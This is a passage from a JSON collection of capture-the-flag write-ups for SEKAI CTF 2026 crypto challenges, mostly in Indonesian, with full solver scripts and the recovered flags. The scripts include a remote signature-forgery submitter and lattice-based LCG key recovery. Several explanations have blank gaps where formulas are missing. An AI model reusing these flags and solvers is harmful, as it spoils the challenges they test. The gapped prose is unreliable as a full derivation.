        "code": "#!/usr/bin/env python3\r\n\"\"\"Remote solver for SEKAI CTF - needLe in a multivariate sekai.\r\n\r\nThe embedded signature was forged after recovering the hidden unimodular\r\ntransformation from the 200 leaked signatures.  It is valid for the fixed\r\nserver message b\"STAGE OF SEKAI\" and the public key shipped with the task.\r\n\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport pickletools\r\nimport re\r\nimport socket\r\nimport sys\r\nimport zlib\r\nfrom pathlib import Path\r\n\r\nDEFAULT_HOST = \"needle-in-a-multivariate-sekai.chals.sekai.team\"\r\nDEFAULT_PORT = 1337\r\nTARGET_MESSAGE = b\"STAGE OF SEKAI\"\r\n\r\nSIGNATURE = [3450864418631778027468557318417, 212800169523885553147739592737104, -68951959825895518020512111668576, 42121974185135009496560345962581, -7538134299148156791593274169606, 4020158207629781713149051733410, 14363440206734639231736472816731, -85963465722516384004970049747969, 6065885952394558053574226670548, -19807275704346004227736633525592, 11302594894450529192755901596725, 79543690423459381306934575241413, -16363453479819539874165224980582, 989018891260538842052666284748, -982178434590729764583105614691, 2489433177473218693635490691933, -4988131520077205271758014767184, -2619450999798765891374744885278, 20079220732015365337951032790071, -1844914633438402454665661888533, 7346783976233578539545218890036, 9873395976559744890227660533461, 65559987670556954611937760993094, -16459601283239233674904601358833, -7125702562536538902759653340158, 6513699559171197838150494436970, -1788826407492507885764788402905, 20254886889644516172164268380411, -62292242522443869581244303982111, -4325886955014163733734381604179, -6594961085147415361760302634493, 12147886435355212633586972730683, 98160848628433350268155597020469, 6634344357751041138495673930591, 15320969021631609808572731593864, -5280764860956177960446145246800, -3483374518736904447813508023427, -107631964056951800557466914111042, -8573529275242806098942469931118, -95458435378604668063958905216477, -8689823097076084341720496621936, -7126905667270907277248176244375, -1567596629013884739625089994775, 51110705111752880611788890999135, -538257065087870699685826025094, -66831420409348571997231010648297, 108610880913779523563741244609024, -109621459980401025729562514193763, 47633905500020777054704020497731, 3533399720313787567803333997587, -10751023464689353643265633938361, 21726042042207469270847966802508, -76863151275281290419502031513879, -9956993349352672660353825239343, 66192556265035132020901762303837, -10719955345031647924041190642497, -2759349882673775566918331575361, 8074315055731330405105021300410, 29130809125042607284832439041214, 5070491950444572776377749229299, 12311464194161630107387392629482, -22668883174413672586070664565843, -4591041275548874524048681796674, -17998047915049713072695695177703, -8437070363930636189595461700302, 11585421075235376051211128165652, -18297709526906212241781285887652, -1457674184362399641745238595593, -8813108671189274650204185292128, -7839655247751315947691025475266, 49169201299104361335860160129714, 10174907659409664559926202562464, 12157878867610295352852298032375, 3104845414667133557625860324499, 12196056388532560197863641385374, -3665260395592875128192042697808, -5821784861986588779148215900471, 13424936787038112043771355306449, -53711965653048961684978327258597, 5415572483966478462531444282000, 5732823974279733664296244478157, -9097954261963018311979325946417, -53377812081964842303226137665393, -9231686826125022050387661788804, -6895544287438044802427733549083, 7333319229269977333412938381127, 5586011206519758001314472446496, 54905936236078735302426835525794, 15603202299919016578351663514488, -76078190608017407458353660237832, 78491840612939759657428802365008, 77543547336461309671810751573533, -6100942191462490849529595177933, -4827555389422026318975719670707, 42789190136617509827823784818298, 58179859605290525388770266895476, -8190098749880941340961968401922, -25624245075313580814078407194758, 5394388578221947417180658160847, -267369039435846488035537626262, -32949997857395868911961135323520, 21835594422537623720827723114819, 2063863782282369073289132460748, -4250424118424428658973218487447, 293272276368233891695442645924729, 57355870038570964753062204652621, 3983878042600669221426249063468, -54077800240953851374686057174111, 6141004102486526510927968549454, 11880500438590356736788192270947, 6071047187826123401533403968512, 68966026148282145206796889063522, -25089349256886393859768868464301, 9916890181710677654708228490366, -16235170461898341484453434374238, -25388228345251402752883191792765, -11227417708192749280591637239218, 66979183757283562597569673863933, -4104450891245635052325127348509, 12592235801874167122888972460195, 34209400924041358797476131558813, 17100027479698621281064919139207, 6950988153397427935358219970618, -15227777820239185948285380498684, -23324289730779035444123179430513, 11263926116990436549500941794494, -50918099192172244213768015821763, -8192744709166264579331538742170, 10268779546532767023577454304848, -3939177776720259295450614734450, 455946704859343068623177981361, -76501158383258960708094726400037, -49605505584025517461201293391833, -26662357688023662028123408050700, 6606761577030946021075159963535, -47491531135019613218048216256866, 47346519744383866606658587140071, 11718414311745607212919458041758, -45607192206976008108078548257416, 15751450588955345202143364577191, 19660140937698703603464569742753, -34425006544220118296192451310333, -6536263313531652106447697936106, 27673339331955895507355768985391]\r\n\r\n\r\ndef load_public_matrix(path: str | Path) -> list[list[int]]:\r\n    \"\"\"Parse Sage's compressed pickle without requiring SageMath.\"\"\"\r\n    raw = zlib.decompress(Path(path).read_bytes())\r\n    packed = next(\r\n        arg\r\n        for opcode, arg, _ in pickletools.genops(raw)\r\n        if opcode.name == \"BINUNICODE\"\r\n        and isinstance(arg, str)\r\n        and len(arg) > 100_000\r\n    )\r\n    values = [int(token, 32) for token in packed.split()]\r\n    n = 144\r\n    if len(values) != n * n:\r\n        raise ValueError(f\"unexpected public matrix size: {len(values)}\")\r\n    return [values[i * n : (i + 1) * n] for i in range(n)]\r\n\r\n\r\ndef target_integer() -> int:\r\n    from hashlib import sha256\r\n\r\n    return int.from_bytes(b\"\\x01\" + sha256(TARGET_MESSAGE).digest(), \"big\")\r\n\r\n\r\ndef quadratic_form(vector: list[int], matrix: list[list[int]]) -> int:\r\n    return sum(\r\n        vector[i] * sum(matrix[i][j] * vector[j] for j in range(144))\r\n        for i in range(144)\r\n    )\r\n\r\n\r\ndef verify_local(pk_path: str | Path) -> None:\r\n    if len(SIGNATURE) != 144:\r\n        raise ValueError(f\"signature has {len(SIGNATURE)} entries, expected 144\")\r\n    matrix = load_public_matrix(pk_path)\r\n    actual = quadratic_form(SIGNATURE, matrix)\r\n    expected = target_integer()\r\n    if actual != expected:\r\n        raise ValueError(\"embedded signature does not verify\")\r\n    print(\"[+] Local verification passed\")\r\n\r\n\r\ndef receive_available(sock: socket.socket, timeout: float = 2.0) -> bytes:\r\n    sock.settimeout(timeout)\r\n    chunks: list[bytes] = []\r\n    while True:\r\n        try:\r\n            chunk = sock.recv(65536)\r\n        except socket.timeout:\r\n            break\r\n        if not chunk:\r\n            break\r\n        chunks.append(chunk)\r\n    return b\"\".join(chunks)\r\n\r\n\r\ndef exploit(host: str, port: int, timeout: float) -> str:\r\n    payload = \" \".join(map(str, SIGNATURE)).encode() + b\"\\n\"\r\n\r\n    with socket.create_connection((host, port), timeout=timeout) as sock:\r\n        banner = receive_available(sock, timeout=1.0)\r\n        if banner:\r\n            sys.stdout.write(banner.decode(errors=\"replace\"))\r\n            sys.stdout.flush()\r\n\r\n        sock.sendall(payload)\r\n        response = receive_available(sock, timeout=timeout).decode(errors=\"replace\")\r\n\r\n    print(response, end=\"\" if response.endswith(\"\\n\") else \"\\n\")\r\n    match = re.search(r\"SEKAI\\{[^}]+\\}\", response)\r\n    if not match:\r\n        raise RuntimeError(\"server response did not contain a SEKAI flag\")\r\n\r\n    flag = match.group(0)\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n    return flag\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=DEFAULT_HOST)\r\n    parser.add_argument(\"--port\", type=int, default=DEFAULT_PORT)\r\n    parser.add_argument(\"--timeout\", type=float, default=10.0)\r\n    parser.add_argument(\"--pk\", default=\"pk.sobj\")\r\n    parser.add_argument(\r\n        \"--verify-only\",\r\n        action=\"store_true\",\r\n        help=\"verify the embedded signature locally and do not connect\",\r\n    )\r\n    parser.add_argument(\r\n        \"--skip-local-verify\",\r\n        action=\"store_true\",\r\n        help=\"connect even when pk.sobj is not available locally\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    if not args.skip_local_verify:\r\n        verify_local(args.pk)\r\n    if not args.verify_only:\r\n        exploit(args.host, args.port, args.timeout)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "```text\nSEKAI{y0U_f0uND_th3_n33dL3!!!_https://youtu.be/Sloi-L5FHBY}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-crypto-oneline6rtyp7o",
    "title": "oneline6cry7o",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "Writeup for challenge oneline6cry7o",
    "problemDescription": "",
    "tools": [],
    "analysis": "Regex pertama memaksa format flag menjadi:\n\n```text\nSEKAI{<67 karakter yang hanya berisi 6 atau 7>}\n```\n\nBagian penting ada pada modulus berikut:\n\n```python\n~(6 + ~7) ** 67\n```\n\nKita sederhanakan operator bitwise complement:\n\n```python\n~7 == -8\n6 + ~7 == -2\n(-2) ** 67 == -(2 ** 67)\n~(-(2 ** 67)) == 2 ** 67 - 1\n```\n\nJadi pengecekan kedua sebenarnya setara dengan:\n\n```python\nint.from_bytes(flag.encode()) % (2**67 - 1) == 0\n```\n\nArtinya seluruh byte flag, jika dianggap sebagai sebuah integer besar, harus habis dibagi:\n\n```text\n2^67 - 1\n```",
    "solution": [
      {
        "title": "Challenge",
        "content": "Deskripsi:",
        "code": "assert __import__('re').match('SEKAI{[67]{67}}$', flag := input()) \\\n    and not int.from_bytes(flag.encode()) % ~(6 + ~7) ** 67"
      },
      {
        "title": "Mengubah Masalah Menjadi Pemilihan Bit",
        "content": "Byte ASCII untuk dua karakter yang diperbolehkan adalah:\n\n\n\nPerbedaannya hanya satu:\n\n\n\nKarena itu, kita dapat memulai dari template yang seluruh isinya adalah `6`:\n\n\n\nSetiap kali satu karakter diganti dari `6` menjadi `7`, nilai integer flag bertambah sebesar pangkat `256` sesuai posisi byte tersebut.\n\nUntuk body sepanjang 67 karakter, kontribusi karakter pada indeks `i` adalah:\n\n\n\nKarena:\n\n\n\nmaka kontribusinya menjadi:\n\n\n\nSelain itu:\n\n\n\nsehingga eksponen dapat direduksi modulo 67:\n\n\n\nKarena `gcd(8, 67) = 1`, pemetaan indeks tersebut merupakan permutasi dari semua posisi bit:\n\n\n\nIni berarti masing-masing dari 67 karakter body mengontrol tepat satu bit unik pada bilangan modulo `2^67 - 1`.\n\nTarget tambahan yang dibutuhkan adalah:\n\n\n\nUntuk setiap posisi karakter:\n\n- gunakan `7` jika bit target yang bersesuaian bernilai `1`;\n- gunakan `6` jika bit tersebut bernilai `0`.",
        "code": "'6' = 0x36\n'7' = 0x37"
      },
      {
        "title": "Solver",
        "content": "Jalankan dengan:\n\n\n\nOutput:",
        "code": "#!/usr/bin/env python3\n\nimport re\n\n\ndef main() -> None:\n    modulus = 2**67 - 1\n\n    base_flag = \"SEKAI{\" + \"6\" * 67 + \"}\"\n    base_value = int.from_bytes(base_flag.encode(), \"big\")\n\n    target = (-base_value) % modulus\n\n    body = []\n\n    for index in range(67):\n        bit_position = (8 * (67 - index)) % 67\n        bit = (target >> bit_position) & 1\n        body.append(\"7\" if bit else \"6\")\n\n    flag = \"SEKAI{\" + \"\".join(body) + \"}\"\n\n    assert re.match(r\"SEKAI{[67]{67}}$\", flag)\n    assert not int.from_bytes(flag.encode()) % ~(6 + ~7) ** 67\n\n    print(flag)\n\n\nif __name__ == \"__main__\":\n    main()"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nimport re\r\n\r\n\r\ndef main() -> None:\r\n    modulus = 2**67 - 1\r\n\r\n    # Start with a valid template whose 67-character body is all '6'.\r\n    base_flag = \"SEKAI{\" + \"6\" * 67 + \"}\"\r\n    base_value = int.from_bytes(base_flag.encode(), \"big\")\r\n\r\n    # Each replacement '6' -> '7' adds exactly 1 to that byte position.\r\n    # We need the total added value to cancel base_value modulo 2^67 - 1.\r\n    target = (-base_value) % modulus\r\n\r\n    body = []\r\n\r\n    for index in range(67):\r\n        # There are 67 body bytes after this position modulo 67.\r\n        # Since 256 == 2^8 and 2^67 == 1 mod (2^67 - 1),\r\n        # this byte contributes 2^(8 * (67 - index)) modulo the modulus.\r\n        bit_position = (8 * (67 - index)) % 67\r\n        bit = (target >> bit_position) & 1\r\n        body.append(\"7\" if bit else \"6\")\r\n\r\n    flag = \"SEKAI{\" + \"\".join(body) + \"}\"\r\n\r\n    # Reproduce the challenge checks exactly.\r\n    assert re.match(r\"SEKAI{[67]{67}}$\", flag)\r\n    assert not int.from_bytes(flag.encode()) % ~(6 + ~7) ** 67\r\n\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "SEKAI{6777676667666666677676776776777766777777777776777767777776677666666}",
    "lessonsLearned": ""
  },
  {
    "id": "projectsekai2026-crypto-orbital-strike",
    "title": "orbital-strike",
    "category": "Crypto",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "ProjectSekai 2026",
    "tags": [],
    "description": "**CTF:** SEKAI CTF 2026  \n**Category:** Crypto  \n**Flag:** `SEKAI{orbital_strike_like_miku_miku_beam!!!}`",
    "problemDescription": "`X` dipakai langsung sebagai key AES-256-ECB, tetapi tidak pernah dicetak. Nilai yang tersedia hanya 14 output dari LCG luar:\n\n```text\nmoon_i = (a * moon_(i-1) + b) mod p\norbit_i = (A * orbit_(i-1) + moon_i) mod P\n```\n\nModulusnya berbeda ukuran:\n\n```text\nP = prime 256 bit\np = prime 311 bit\n```\n\nSerangannya tidak menebak parameter LCG. Selisih output `orbit` dimasukkan ke lattice untuk mencari relasi linear pendek. Resultant dari relasi tersebut membocorkan `p`, lalu akar polinomial bersama membocorkan `a`. Setelah selisih state LCG dalam pulih, `P`, `A`, dan akhirnya `X` dapat dihitung.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "1. Selisih output",
        "content": "Misalkan output yang diketahui adalah `y_1, ..., y_14` dan:\n\n\n\nDibuat lattice dengan 11 baris:\n\n\n\n`e_i` adalah basis identitas berdimensi 11. Setelah LLL, beberapa baris mempunyai tiga koordinat awal bernilai nol. Bagian sisanya memberi koefisien pendek `l_0, ..., l_10` yang memenuhi:\n\n\n\nPada data challenge, enam relasi terpendek adalah relasi asli dari LCG dalam.",
        "code": "d_i = y_(i+1) - y_i"
      },
      {
        "title": "2. Memulihkan `p` dan `a`",
        "content": "Untuk state bulan `m_i`, definisikan:\n\n\n\nKarena state bulan berasal dari LCG:\n\n\n\nJika relasi lattice ditulis sebagai polinomial:\n\n\n\nmaka relasi yang benar memenuhi:\n\n\n\nDua polinomial yang memiliki akar bersama modulo `p` mempunyai resultant yang habis dibagi `p`. GCD beberapa pairwise resultant menghasilkan:\n\n\n\nSetelah semua polinomial direduksi modulo `p`, polynomial GCD-nya linear:\n\n\n\nJadi:",
        "code": "delta_i = m_(i+1) - m_i"
      },
      {
        "title": "3. Memulihkan selisih state bulan",
        "content": "Enam relasi yang valid ditempatkan pada dua offset:\n\n\n\nMatriks blok ini mempunyai integer kernel berdimensi tiga. Basis kernel direduksi dengan LLL, lalu koefisien kombinasinya dipaksa memenuhi:\n\n\n\nConstraint modular tersebut menyisakan satu dimensi. LLL kedua menghasilkan vektor bertanda:\n\n\n\nSetiap elemennya berada pada interval `(-p, p)` dan merepresentasikan selisih state bulan sebagai integer biasa, bukan hanya residue modulo `p`.",
        "code": "[l_0 ... l_10 0]\n[0 l_0 ... l_10]"
      },
      {
        "title": "4. Memulihkan `P` dan `A`",
        "content": "Dari LCG luar:\n\n\n\nKurangi dua persamaan berurutan:\n\n\n\natau:\n\n\n\nEliminasi `A` dari dua indeks `i` dan `j`:\n\n\n\nSemua `C_(i,j)` habis dibagi modulus luar `P`. GCD seluruh cross-product memberi:\n\n\n\nMultiplier luar dihitung dari salah satu persamaan modular:\n\n\n\nHasilnya:",
        "code": "m_i = y_i - A*y_(i-1) mod P"
      },
      {
        "title": "5. Memulihkan `X`",
        "content": "State bulan kedua diketahui modulo `P`:\n\n\n\nSelisih sebelumnya diperoleh dengan membalik recurrence:\n\n\n\nAda dua representasi bertanda, yaitu `r` atau `r-p`. Hanya satu yang memungkinkan seluruh state `m_1, ..., m_14` tetap berada pada interval `[0, p)`.\n\nSetelah `m_1 mod P` diketahui:\n\n\n\nNilainya:",
        "code": "m_2 = y_2 - A*y_1 mod P"
      },
      {
        "title": "6. Dekripsi",
        "content": "Ciphertext dienkripsi memakai AES-256-ECB dan PKCS#7 padding:\n\n\n\nHasil dekripsi:\n\n\n\nSolver juga meregenerasi seluruh 14 output `orbit` sebelum menerima flag, sehingga parameter hasil recovery tidak hanya lolos padding AES.",
        "code": "plaintext = unpad(\n    AES.new(X.to_bytes(32, \"big\"), AES.MODE_ECB).decrypt(bytes.fromhex(star)),\n    16,\n)"
      },
      {
        "title": "Menjalankan solver",
        "content": "Output:",
        "code": "source /home/nata/ctf_env/bin/activate\npip install pycryptodome sympy fpylll cysignals\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"Solver for SEKAI CTF 2026 Crypto - orbital-strike.\r\n\r\nDependencies:\r\n    pip install pycryptodome sympy fpylll cysignals\r\n\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport itertools\r\nimport math\r\nimport re\r\nfrom dataclasses import dataclass\r\n\r\nimport sympy as sp\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto.Util.Padding import unpad\r\nfrom fpylll import IntegerMatrix, LLL\r\n\r\nORBIT = [\r\n    46157012221654917396851254347154820393060391878580715960476654689260395468184,\r\n    36926194633341127588542680684095293820802193681748458943524916140809713523560,\r\n    16005201943847263206512436577001283414470030273089746675203830598137794555134,\r\n    28937919714389596084610407023450127584695575606301484773390370819366639643218,\r\n    11459012353705334109041842799942754581703065868230253271729711591416155557180,\r\n    31030059279554219046464541926833857543445131889728181065565033726460506326840,\r\n    20987315604501021667042879662101693092441980938033961081037347214532349371248,\r\n    76741461130245451493723909055453557280102065396647043801270629949855565452326,\r\n    84258885183671683674472390974667571532577240974449641001706593550302243268268,\r\n    59535034089467707172052245359810812420431903279354584714432674122159502991956,\r\n    7115679899033391144975170596669540596311296590450661546000723388170577963715,\r\n    35572951991838484594163260879328705523576344587262461128887804475450813563036,\r\n    85569022704397114858282741078883377190544624744955636482627379979792474136036,\r\n    5047270986830280372910174287287823507537624765267582560460157826800286170460,\r\n]\r\nSTAR = bytes.fromhex(\r\n    \"1664ff83cbca2643b357bcdc8c3d6e15\"\r\n    \"48615a18cec73e734a82e163b32a9b0c\"\r\n    \"367c61bab01140a04ac8eda8b007d1d6\"\r\n)\r\n\r\n\r\n@dataclass(frozen=True)\r\nclass Recovered:\r\n    P: int\r\n    p: int\r\n    A: int\r\n    a: int\r\n    b: int\r\n    X: int\r\n    moons: tuple[int, ...]\r\n    flag: bytes\r\n\r\n\r\ndef vector_bits(v: list[int]) -> int:\r\n    return max((abs(x).bit_length() for x in v), default=0)\r\n\r\n\r\ndef build_public_kernel(differences: list[int]) -> list[list[int]]:\r\n    \"\"\"Find short polynomials annihilating three shifted orbit-difference windows.\"\"\"\r\n    n_windows = 11\r\n    shifts = 3\r\n    scale = 1 << 512\r\n\r\n    basis = IntegerMatrix(n_windows, n_windows + shifts)\r\n    for i in range(n_windows):\r\n        for j in range(shifts):\r\n            basis[i, j] = scale * differences[i + j]\r\n        basis[i, shifts + i] = 1\r\n\r\n    LLL.reduction(basis, delta=0.999)\r\n\r\n    rows: list[list[int]] = []\r\n    for row in range(n_windows):\r\n        prefix = [int(basis[row, j]) for j in range(shifts)]\r\n        coeffs = [int(basis[row, shifts + i]) for i in range(n_windows)]\r\n        if prefix == [0, 0, 0]:\r\n            rows.append(coeffs)\r\n\r\n    rows.sort(key=lambda v: (vector_bits(v), sum(x * x for x in v)))\r\n    if len(rows) < 6:\r\n        raise RuntimeError(\"failed to recover enough exact public-kernel vectors\")\r\n    return rows\r\n\r\n\r\ndef prime_factor_with_bits(value: int, bits: int) -> int | None:\r\n    value = abs(value)\r\n    if value <= 1:\r\n        return None\r\n    if value.bit_length() == bits and sp.isprime(value):\r\n        return value\r\n\r\n    # In this instance the cofactor is tiny. A bounded factorization strips it\r\n    # and leaves the 311-bit prime intact.\r\n    factors = sp.factorint(value, limit=100_000)\r\n    for factor in factors:\r\n        q = int(factor)\r\n        if q.bit_length() == bits and sp.isprime(q):\r\n            return q\r\n    return None\r\n\r\n\r\ndef recover_inner_parameters(kernel_rows: list[list[int]]) -> tuple[int, int, list[list[int]]]:\r\n    \"\"\"Recover inner modulus p and multiplier a from polynomial resultants.\"\"\"\r\n    x = sp.symbols(\"x\")\r\n    polynomials = [\r\n        sp.Poly(sum(c * x**i for i, c in enumerate(row)), x, domain=sp.ZZ)\r\n        for row in kernel_rows\r\n    ]\r\n\r\n    p: int | None = None\r\n    selected_count = 0\r\n\r\n    # The true relations form the visibly short prefix of the reduced basis.\r\n    # Their pairwise resultants all contain the same 311-bit prime.\r\n    for take in range(3, len(polynomials) + 1):\r\n        common = 0\r\n        for i, j in itertools.combinations(range(take), 2):\r\n            resultant = abs(int(sp.resultant(polynomials[i], polynomials[j], x)))\r\n            common = math.gcd(common, resultant)\r\n        candidate = prime_factor_with_bits(common, 311)\r\n        if candidate is not None:\r\n            p = candidate\r\n            selected_count = take\r\n            break\r\n\r\n    if p is None:\r\n        raise RuntimeError(\"311-bit common resultant factor was not found\")\r\n\r\n    polynomial_gcd = sp.Poly(polynomials[0], modulus=p)\r\n    for poly in polynomials[1:selected_count]:\r\n        polynomial_gcd = sp.gcd(polynomial_gcd, sp.Poly(poly, modulus=p))\r\n\r\n    if polynomial_gcd.degree() != 1:\r\n        raise RuntimeError(f\"unexpected polynomial gcd degree: {polynomial_gcd.degree()}\")\r\n\r\n    leading, constant = [int(c) % p for c in polynomial_gcd.all_coeffs()]\r\n    a = (-constant * pow(leading, -1, p)) % p\r\n\r\n    good_rows = [\r\n        row\r\n        for row in kernel_rows\r\n        if sum(c * pow(a, i, p) for i, c in enumerate(row)) % p == 0\r\n    ]\r\n    good_rows.sort(key=lambda v: (vector_bits(v), sum(x * x for x in v)))\r\n    if len(good_rows) < 6:\r\n        raise RuntimeError(\"not enough inner-LCG annihilators after root validation\")\r\n\r\n    # Six independent relations are enough for the shifted block kernel.\r\n    return p, a, good_rows[:6]\r\n\r\n\r\ndef orthogonal_kernel(relations: list[list[int]]) -> list[list[int]]:\r\n    \"\"\"Compute the 3-dimensional integer kernel of shifted relations.\"\"\"\r\n    block_rows: list[list[int]] = []\r\n    for relation in relations:\r\n        block_rows.append(relation + [0])\r\n        block_rows.append([0] + relation)\r\n\r\n    dimension = 12\r\n    scale = 1 << 1024\r\n    embedded = IntegerMatrix(dimension, dimension * 2)\r\n\r\n    # A vector z is orthogonal to every block row iff the scaled prefix is 0.\r\n    for i in range(dimension):\r\n        for j in range(dimension):\r\n            embedded[i, j] = scale * block_rows[j][i]\r\n        embedded[i, dimension + i] = 1\r\n\r\n    LLL.reduction(embedded, delta=0.999)\r\n\r\n    vectors: list[list[int]] = []\r\n    for row in range(dimension):\r\n        prefix = [int(embedded[row, j]) for j in range(dimension)]\r\n        if all(x == 0 for x in prefix):\r\n            vectors.append([int(embedded[row, dimension + j]) for j in range(dimension)])\r\n\r\n    if len(vectors) != 3:\r\n        raise RuntimeError(f\"unexpected shifted-kernel rank: {len(vectors)}\")\r\n    return vectors\r\n\r\n\r\ndef nullspace_mod_prime(matrix: list[list[int]], modulus: int) -> list[list[int]]:\r\n    \"\"\"Reduced-row-echelon nullspace over F_modulus.\"\"\"\r\n    work = [[x % modulus for x in row] for row in matrix]\r\n    row_count = len(work)\r\n    col_count = len(work[0])\r\n    pivots: list[int] = []\r\n    pivot_row = 0\r\n\r\n    for column in range(col_count):\r\n        selected = next(\r\n            (r for r in range(pivot_row, row_count) if work[r][column] != 0),\r\n            None,\r\n        )\r\n        if selected is None:\r\n            continue\r\n\r\n        work[pivot_row], work[selected] = work[selected], work[pivot_row]\r\n        inverse = pow(work[pivot_row][column], -1, modulus)\r\n        work[pivot_row] = [(x * inverse) % modulus for x in work[pivot_row]]\r\n\r\n        for r in range(row_count):\r\n            if r == pivot_row or work[r][column] == 0:\r\n                continue\r\n            factor = work[r][column]\r\n            work[r] = [\r\n                (work[r][c] - factor * work[pivot_row][c]) % modulus\r\n                for c in range(col_count)\r\n            ]\r\n\r\n        pivots.append(column)\r\n        pivot_row += 1\r\n\r\n    free_columns = [c for c in range(col_count) if c not in pivots]\r\n    result: list[list[int]] = []\r\n    for free in free_columns:\r\n        vector = [0] * col_count\r\n        vector[free] = 1\r\n        for r, pivot in reversed(list(enumerate(pivots))):\r\n            vector[pivot] = -sum(\r\n                work[r][c] * vector[c] for c in free_columns\r\n            ) % modulus\r\n        result.append(vector)\r\n    return result\r\n\r\n\r\ndef recover_moon_differences(p: int, a: int, relations: list[list[int]]) -> list[list[int]]:\r\n    \"\"\"Recover signed differences delta_2..delta_13 of the inner LCG.\"\"\"\r\n    kernel = orthogonal_kernel(relations)\r\n\r\n    recurrence_matrix = [\r\n        [\r\n            (kernel[j][i + 1] - a * kernel[j][i]) % p\r\n            for j in range(len(kernel))\r\n        ]\r\n        for i in range(11)\r\n    ]\r\n    coefficient_nullspace = nullspace_mod_prime(recurrence_matrix, p)\r\n    if len(coefficient_nullspace) != 1:\r\n        raise RuntimeError(\"inner recurrence did not leave a one-dimensional coefficient space\")\r\n\r\n    coefficient_vector = coefficient_nullspace[0]\r\n    generators = [\r\n        [\r\n            sum(coefficient_vector[j] * kernel[j][i] for j in range(3))\r\n            for i in range(12)\r\n        ]\r\n    ]\r\n    for j in range(3):\r\n        generators.append([p * kernel[j][i] for i in range(12)])\r\n\r\n    lattice = IntegerMatrix(len(generators), 12)\r\n    for i, row in enumerate(generators):\r\n        for j, value in enumerate(row):\r\n            lattice[i, j] = value\r\n    LLL.reduction(lattice, delta=0.999)\r\n\r\n    candidates: list[list[int]] = []\r\n    seen: set[tuple[int, ...]] = set()\r\n    for row in range(len(generators)):\r\n        vector = [int(lattice[row, i]) for i in range(12)]\r\n        if not any(vector):\r\n            continue\r\n        if max(abs(x) for x in vector) >= p:\r\n            continue\r\n        if not all((vector[i + 1] - a * vector[i]) % p == 0 for i in range(11)):\r\n            continue\r\n\r\n        for oriented in (vector, [-x for x in vector]):\r\n            key = tuple(oriented)\r\n            if key not in seen:\r\n                seen.add(key)\r\n                candidates.append(oriented)\r\n\r\n    if not candidates:\r\n        raise RuntimeError(\"no bounded moon-difference vector found\")\r\n    return candidates\r\n\r\n\r\ndef candidate_prime_factors(value: int, bits: int) -> list[int]:\r\n    value = abs(value)\r\n    if value <= 1:\r\n        return []\r\n    if value.bit_length() == bits and sp.isprime(value):\r\n        return [value]\r\n    return [\r\n        int(q)\r\n        for q in sp.factorint(value, limit=100_000)\r\n        if int(q).bit_length() == bits and sp.isprime(int(q))\r\n    ]\r\n\r\n\r\ndef interval_for_m2(p: int, delta1: int, later_deltas: list[int]) -> tuple[int, int]:\r\n    \"\"\"Return [lo, hi) such that all reconstructed moon states are in [0,p).\"\"\"\r\n    offsets = [-delta1, 0]  # m1-m2, m2-m2\r\n    cumulative = 0\r\n    for delta in later_deltas:\r\n        cumulative += delta\r\n        offsets.append(cumulative)\r\n    return max(-x for x in offsets), min(p - x for x in offsets)\r\n\r\n\r\ndef try_outer_recovery(\r\n    p: int,\r\n    a: int,\r\n    moon_differences: list[int],\r\n    orbit: list[int],\r\n    ciphertext: bytes,\r\n) -> Recovered | None:\r\n    d = [orbit[i + 1] - orbit[i] for i in range(len(orbit) - 1)]\r\n\r\n    # delta_n = d_n - A*d_(n-1) (mod P), n=2..13.\r\n    left = [d[i + 1] - moon_differences[i] for i in range(12)]\r\n    right = d[:12]\r\n\r\n    common = 0\r\n    for i, j in itertools.combinations(range(12), 2):\r\n        common = math.gcd(common, abs(left[i] * right[j] - left[j] * right[i]))\r\n\r\n    for P in candidate_prime_factors(common, 256):\r\n        if P <= max(orbit):\r\n            continue\r\n\r\n        A: int | None = None\r\n        for lhs, rhs in zip(left, right):\r\n            if math.gcd(rhs, P) == 1:\r\n                A = (lhs * pow(rhs, -1, P)) % P\r\n                break\r\n        if A is None or A == 0:\r\n            continue\r\n        if not all((lhs - A * rhs) % P == 0 for lhs, rhs in zip(left, right)):\r\n            continue\r\n\r\n        m2_residue = (orbit[1] - A * orbit[0]) % P\r\n        delta1_residue = (pow(a, -1, p) * (moon_differences[0] % p)) % p\r\n\r\n        for delta1 in (delta1_residue, delta1_residue - p):\r\n            lo, hi = interval_for_m2(p, delta1, moon_differences)\r\n            k_min = max(0, (lo - m2_residue + P - 1) // P)\r\n            k_max = (hi - 1 - m2_residue) // P\r\n            if k_min > k_max:\r\n                continue\r\n\r\n            # Any valid lift gives the same m1 modulo P and therefore the same X.\r\n            m2 = m2_residue + k_min * P\r\n            m1 = m2 - delta1\r\n            moons = [m1, m2]\r\n            for delta in moon_differences:\r\n                moons.append(moons[-1] + delta)\r\n\r\n            if len(moons) != 14 or not all(0 <= m < p for m in moons):\r\n                continue\r\n\r\n            b = (moons[1] - a * moons[0]) % p\r\n            if not all(moons[i + 1] == (a * moons[i] + b) % p for i in range(13)):\r\n                continue\r\n\r\n            m1_mod_P = (m2_residue - delta1) % P\r\n            X = ((orbit[0] - m1_mod_P) * pow(A, -1, P)) % P\r\n\r\n            state = X\r\n            regenerated: list[int] = []\r\n            for moon in moons:\r\n                state = (A * state + moon) % P\r\n                regenerated.append(state)\r\n            if regenerated != orbit:\r\n                continue\r\n\r\n            try:\r\n                plaintext = unpad(\r\n                    AES.new(X.to_bytes(32, 